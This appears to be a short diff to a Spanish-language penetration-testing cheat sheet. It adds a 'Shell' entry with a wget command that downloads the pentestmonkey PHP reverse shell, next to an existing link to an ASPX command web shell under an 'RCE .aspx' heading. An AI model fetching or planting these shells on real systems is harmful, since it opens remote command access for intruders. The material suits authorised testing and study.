@@ -42,6 +42,11 @@ RCE .aspx
 https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
 ```
 
+Shell
+```
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
 # Powershell
 
 Descargar binarios
